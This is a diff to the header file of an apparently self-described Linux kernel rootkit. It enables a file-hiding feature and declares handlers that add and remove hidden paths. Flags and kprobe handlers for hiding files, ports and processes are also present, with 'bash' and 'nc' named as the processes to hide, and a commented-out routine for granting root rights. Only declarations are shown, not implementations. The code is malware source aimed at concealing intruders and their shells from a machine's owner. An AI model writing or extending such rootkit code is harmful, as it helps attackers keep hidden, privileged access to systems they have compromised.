@@ -21,8 +21,13 @@
 #include <linux/netfilter_ipv4.h>
 #include <linux/ip.h>
 #include <linux/tcp.h>
+#include <linux/inet.h>  
+#include <linux/icmp.h>  
+#include <linux/skbuff.h>
+#include <linux/net.h>
 
-#define FILE_HIDE_C 0
+
+#define FILE_HIDE_C 1
 #define LKM_HIDE_C 0
 #define PID_HIDE_C 0
 #define PORT_HIDE_C 0
@@ -50,12 +55,18 @@
 
 #if FILE_HIDE_C
 void file_hide_handler(struct kprobe *p, struct pt_regs *regs);
+
+void add_file_handler(char *path, int pathlen);
+void remove_file_handler(char *path);
+#define MAX_PATHS_HIDE 10
+
 #endif
 #if PID_HIDE_C
 
 #define HIDE_CMD1 "bash"
 #define HIDE_CMD2 "nc"
 #define MAX_PIDS 10
+
 void pid_hide_handler(struct kprobe *p, struct pt_regs *regs);
 
 #endif
@@ -66,10 +77,10 @@ void pid_hide_handler(struct kprobe *p, struct pt_regs *regs);
 void port_hide_handler(struct kprobe *p, struct pt_regs *regs);
 #endif
 
-
+#ifdef MAIN_C
 static int __init rootkit_init(void);
 static void __exit rootkit_initexit(void);
-
+#endif
 // static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs);
 // static int grant_root_rights(pid_t pid);
 #endif
